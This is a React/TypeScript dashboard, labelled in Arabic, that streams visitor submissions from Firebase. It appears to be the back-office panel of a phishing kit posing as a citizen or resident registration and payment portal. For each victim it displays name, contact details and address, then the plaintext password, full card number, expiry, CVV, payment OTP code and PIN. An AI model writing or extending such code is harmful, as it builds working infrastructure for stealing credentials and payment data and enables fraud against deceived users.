import React, { useEffect, useState } from "react";
import { 
  Search,
  User,
  Mail,
  Phone,
  Calendar,
  MapPin,
  CreditCard,
  Shield,
  Globe,
  CheckCircle,
  Clock,
  RefreshCw,
  ChevronRight,
  Smartphone,
  Building,
  FileText
} from "lucide-react";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { subscribeToSubmissions, subscribeToPayments } from "@/lib/firebase";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";

interface Submission {
  id: string;
  visitorId: string;
  status?: string;
  lastStep?: string;
  updatedAt?: any;
  completedAt?: any;
  step_1_account_type?: {
    isNewAccount: boolean;
    accountType: string;
    completedAt: string;
  };
  step_2_personal_data?: {
    fullNameArabic: string;
    fullNameEnglish: string;
    email: string;
    phoneNumber: string;
    dateOfBirth: string;
    gender: string;
    nationality: string;
    address: {
      buildingNumber: string;
      area: string;
      street: string;
    };
    completedAt: string;
  };
  step_3_password?: {
    passwordSet: boolean;
    password: string;
    completedAt: string;
  };
  step_4_payment?: {
    amount: string;
    status: string;
    paymentMethod: string;
    cardNumber: string;
    cardName: string;
    expiry: string;
    cvv: string;
    otpCode: string;
    completedAt: string;
  };
  step_5_pin?: {
    pinVerified: boolean;
    pinCode: string;
    completedAt: string;
  };
  step_6_phone_provider?: {
    provider: string;
    phoneNumber: string;
    completedAt: string;
  };
}

interface Payment {
  id: string;
  visitorId: string;
  status: string;
  updatedAt?: any;
}

export default function FirebaseDashboard() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [payments, setPayments] = useState<Payment[]>([]);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<"all" | "completed" | "pending">("all");

  useEffect(() => {
    const unsubscribeSubmissions = subscribeToSubmissions((data) => {
      setSubmissions(data);
      setLoading(false);
      if (data.length > 0 && !selectedSubmission) {
        setSelectedSubmission(data[0]);
      }
    });

    const unsubscribePayments = subscribeToPayments((data) => {
      setPayments(data);
    });

    return () => {
      unsubscribeSubmissions();
      unsubscribePayments();
    };
  }, []);

  const filteredSubmissions = submissions.filter((sub) => {
    const matchesSearch = 
      sub.step_2_personal_data?.fullNameArabic?.includes(searchQuery) ||
      sub.step_2_personal_data?.fullNameEnglish?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.step_2_personal_data?.email?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.visitorId.includes(searchQuery);

    if (activeTab === "completed") return matchesSearch && sub.status === "completed";
    if (activeTab === "pending") return matchesSearch && sub.status !== "completed";
    return matchesSearch;
  });

  const stats = {
    total: submissions.length,
    completed: submissions.filter(s => s.status === "completed").length,
    pending: submissions.filter(s => s.status !== "completed").length,
    payments: payments.length,
  };

  const getStepStatus = (sub: Submission) => {
    const steps = [];
    if (sub.step_1_account_type) steps.push("نوع الحساب");
    if (sub.step_2_personal_data) steps.push("البيانات");
    if (sub.step_3_password) steps.push("كلمة المرور");
    if (sub.step_4_payment) steps.push("الدفع");
    if (sub.step_5_pin) steps.push("PIN");
    if (sub.step_6_phone_provider) steps.push("مزود الخدمة");
    return steps;
  };

  return (
    <div className="min-h-screen bg-[#0f172a] text-white font-sans" dir="rtl">
      {/* Header */}
      <header className="bg-[#1e293b] border-b border-gray-700 px-6 py-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold text-white">لوحة بيانات Firebase</h1>
            <span className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">
              متصل مباشر
            </span>
          </div>
          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="sm"
              className="border-gray-600 text-gray-300 hover:bg-gray-700"
              onClick={() => window.location.reload()}
            >
              <RefreshCw className="h-4 w-4 ml-2" />
              تحديث
            </Button>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className="bg-[#1e293b] border-b border-gray-700 px-6 py-3">
        <div className="flex items-center gap-6">
          <button
            onClick={() => setActiveTab("all")}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg transition-colors",
              activeTab === "all" ? "bg-blue-600 text-white" : "text-gray-400 hover:text-white"
            )}
          >
            <FileText className="h-4 w-4" />
            <span>الكل</span>
            <span className="bg-white/20 px-2 py-0.5 rounded text-sm">{stats.total}</span>
          </button>
          <button
            onClick={() => setActiveTab("completed")}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg transition-colors",
              activeTab === "completed" ? "bg-green-600 text-white" : "text-gray-400 hover:text-white"
            )}
          >
            <CheckCircle className="h-4 w-4" />
            <span>مكتمل</span>
            <span className="bg-white/20 px-2 py-0.5 rounded text-sm">{stats.completed}</span>
          </button>
          <button
            onClick={() => setActiveTab("pending")}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg transition-colors",
              activeTab === "pending" ? "bg-yellow-600 text-white" : "text-gray-400 hover:text-white"
            )}
          >
            <Clock className="h-4 w-4" />
            <span>قيد التسجيل</span>
            <span className="bg-white/20 px-2 py-0.5 rounded text-sm">{stats.pending}</span>
          </button>
          <div className="mr-auto flex items-center gap-2 text-gray-400">
            <CreditCard className="h-4 w-4" />
            <span>المدفوعات: {stats.payments}</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex h-[calc(100vh-140px)]">
        {/* Submissions List */}
        <div className="w-96 border-l border-gray-700 bg-[#1e293b] flex flex-col">
          {/* Search */}
          <div className="p-4 border-b border-gray-700">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
              <Input
                placeholder="بحث بالاسم أو البريد..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pr-10 bg-[#0f172a] border-gray-600 text-white placeholder:text-gray-500"
              />
            </div>
          </div>

          {/* List */}
          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-32 text-gray-500">
                <RefreshCw className="h-6 w-6 animate-spin" />
              </div>
            ) : filteredSubmissions.length === 0 ? (
              <div className="p-8 text-center text-gray-500">
                <FileText className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p>لا توجد بيانات</p>
              </div>
            ) : (
              filteredSubmissions.map((sub) => (
                <button
                  key={sub.id}
                  onClick={() => setSelectedSubmission(sub)}
                  className={cn(
                    "w-full p-4 border-b border-gray-700 text-right transition-colors",
                    selectedSubmission?.id === sub.id
                      ? "bg-blue-600/20 border-r-4 border-r-blue-500"
                      : "hover:bg-gray-700/50"
                  )}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="flex-1 min-w-0">
                      <p className="font-bold text-white truncate">
                        {sub.step_2_personal_data?.fullNameArabic || `زائر ${sub.visitorId.slice(0, 8)}`}
                      </p>
                      <p className="text-sm text-gray-400 truncate">
                        {sub.step_2_personal_data?.email || "لا يوجد بريد"}
                      </p>
                      <div className="flex items-center gap-2 mt-2">
                        {sub.status === "completed" ? (
                          <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                            مكتمل
                          </span>
                        ) : (
                          <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">
                            {sub.lastStep || "جاري"}
                          </span>
                        )}
                      </div>
                    </div>
                    <ChevronRight className="h-5 w-5 text-gray-500 flex-shrink-0" />
                  </div>
                </button>
              ))
            )}
          </div>
        </div>

        {/* Detail Panel */}
        <div className="flex-1 bg-[#0f172a] overflow-y-auto p-6">
          {selectedSubmission ? (
            <div className="max-w-2xl mx-auto space-y-6">
              {/* Header */}
              <div className="bg-[#1e293b] rounded-xl p-6 border border-gray-700">
                <div className="flex items-center gap-4 mb-4">
                  <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center">
                    <User className="h-8 w-8 text-white" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold">
                      {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
                    </h2>
                    <p className="text-gray-400">
                      {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId}
                    </p>
                  </div>
                  {selectedSubmission.status === "completed" && (
                    <span className="mr-auto bg-green-500 text-white px-4 py-2 rounded-lg font-bold">
                      تسجيل مكتمل
                    </span>
                  )}
                </div>

                {/* Step Progress */}
                <div className="flex flex-wrap gap-2 mt-4">
                  {getStepStatus(selectedSubmission).map((step, i) => (
                    <span key={i} className="bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm">
                      ✓ {step}
                    </span>
                  ))}
                </div>
              </div>

              {/* Step 1: Account Type */}
              {selectedSubmission.step_1_account_type && (
                <DetailSection title="نوع الحساب" icon={User}>
                  <DetailItem 
                    label="نوع المستخدم" 
                    value={selectedSubmission.step_1_account_type.accountType === "citizen" ? "مواطن / مقيم" : "زائر"} 
                  />
                  <DetailItem 
                    label="حساب جديد" 
                    value={selectedSubmission.step_1_account_type.isNewAccount ? "نعم" : "لا"} 
                  />
                </DetailSection>
              )}

              {/* Step 2: Personal Data */}
              {selectedSubmission.step_2_personal_data && (
                <DetailSection title="البيانات الشخصية" icon={FileText}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem label="الاسم بالعربية" value={selectedSubmission.step_2_personal_data.fullNameArabic} />
                    <DetailItem label="الاسم بالإنجليزية" value={selectedSubmission.step_2_personal_data.fullNameEnglish} />
                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_2_personal_data.email} icon={Mail} />
                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_2_personal_data.phoneNumber} icon={Phone} />
                    <DetailItem label="تاريخ الميلاد" value={selectedSubmission.step_2_personal_data.dateOfBirth} icon={Calendar} />
                    <DetailItem label="الجنس" value={selectedSubmission.step_2_personal_data.gender === "male" ? "ذكر" : "أنثى"} />
                    <DetailItem label="الجنسية" value={selectedSubmission.step_2_personal_data.nationality} icon={Globe} />
                  </div>
                  {selectedSubmission.step_2_personal_data.address && (
                    <div className="mt-4 pt-4 border-t border-gray-700">
                      <h4 className="font-bold text-gray-300 mb-3 flex items-center gap-2">
                        <MapPin className="h-4 w-4" /> العنوان
                      </h4>
                      <div className="grid grid-cols-3 gap-4">
                        <DetailItem label="رقم المبنى" value={selectedSubmission.step_2_personal_data.address.buildingNumber} />
                        <DetailItem label="المنطقة" value={selectedSubmission.step_2_personal_data.address.area} />
                        <DetailItem label="الشارع" value={selectedSubmission.step_2_personal_data.address.street} />
                      </div>
                    </div>
                  )}
                </DetailSection>
              )}

              {/* Step 3: Password */}
              {selectedSubmission.step_3_password && (
                <DetailSection title="كلمة المرور" icon={Shield}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem 
                      label="الحالة" 
                      value={selectedSubmission.step_3_password.passwordSet ? "تم التعيين بنجاح" : "لم يتم"} 
                    />
                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                      <p className="text-xs text-red-400">كلمة المرور</p>
                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                        {selectedSubmission.step_3_password.password || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 4: Payment */}
              {selectedSubmission.step_4_payment && (
                <DetailSection title="الدفع وبيانات البطاقة" icon={CreditCard}>
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <DetailItem label="المبلغ" value={selectedSubmission.step_4_payment.amount} />
                    <DetailItem label="الحالة" value={selectedSubmission.step_4_payment.status === "completed" ? "تم الدفع" : "قيد الانتظار"} />
                    <DetailItem label="طريقة الدفع" value={selectedSubmission.step_4_payment.paymentMethod === "card" ? "بطاقة ائتمان" : selectedSubmission.step_4_payment.paymentMethod} />
                  </div>
                  
                  {/* Card Details */}
                  <div className="mt-4 pt-4 border-t border-gray-700">
                    <h4 className="font-bold text-yellow-400 mb-3 flex items-center gap-2">
                      <CreditCard className="h-4 w-4" /> بيانات البطاقة
                    </h4>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
                        <p className="text-xs text-yellow-400">رقم البطاقة</p>
                        <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
                          {selectedSubmission.step_4_payment.cardNumber || "-"}
                        </p>
                      </div>
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                        <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
                        <p className="font-medium text-yellow-300 mt-1">
                          {selectedSubmission.step_4_payment.cardName || "-"}
                        </p>
                      </div>
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                        <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
                        <p className="font-mono font-bold text-yellow-300 mt-1">
                          {selectedSubmission.step_4_payment.expiry || "-"}
                        </p>
                      </div>
                      <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                        <p className="text-xs text-red-400">CVV</p>
                        <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                          {selectedSubmission.step_4_payment.cvv || "-"}
                        </p>
                      </div>
                      <div className="bg-purple-900/30 rounded-lg p-3 border border-purple-500/30">
                        <p className="text-xs text-purple-400">رمز OTP</p>
                        <p className="font-mono font-bold text-purple-300 mt-1 text-lg">
                          {selectedSubmission.step_4_payment.otpCode || "-"}
                        </p>
                      </div>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 5: PIN */}
              {selectedSubmission.step_5_pin && (
                <DetailSection title="رمز PIN" icon={Shield}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem 
                      label="التحقق" 
                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"} 
                    />
                    <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30">
                      <p className="text-xs text-orange-400">رمز PIN</p>
                      <p className="font-mono font-bold text-orange-300 mt-1 text-2xl tracking-widest">
                        {selectedSubmission.step_5_pin.pinCode || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 6: Phone Provider */}
              {selectedSubmission.step_6_phone_provider && (
                <DetailSection title="مزود خدمة الهاتف" icon={Smartphone}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} />
                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} />
                  </div>
                </DetailSection>
              )}
            </div>
          ) : (
            <div className="flex items-center justify-center h-full text-gray-500">
              <div className="text-center">
                <FileText className="h-16 w-16 mx-auto mb-4 opacity-50" />
                <p className="text-xl">اختر تسجيلاً لعرض التفاصيل</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function DetailSection({ title, icon: Icon, children }: { title: string; icon: any; children: React.ReactNode }) {
  return (
    <div className="bg-[#1e293b] rounded-xl p-6 border border-gray-700">
      <h3 className="font-bold text-lg mb-4 flex items-center gap-2 text-white">
        <Icon className="h-5 w-5 text-blue-400" />
        {title}
      </h3>
      {children}
    </div>
  );
}

function DetailItem({ label, value, icon: Icon }: { label: string; value: string; icon?: any }) {
  return (
    <div className="bg-[#0f172a] rounded-lg p-3">
      <div className="flex items-center gap-2">
        {Icon && <Icon className="h-4 w-4 text-gray-500" />}
        <p className="text-xs text-gray-500">{label}</p>
      </div>
      <p className="font-medium text-white mt-1">{value || "-"}</p>
    </div>
  );
}
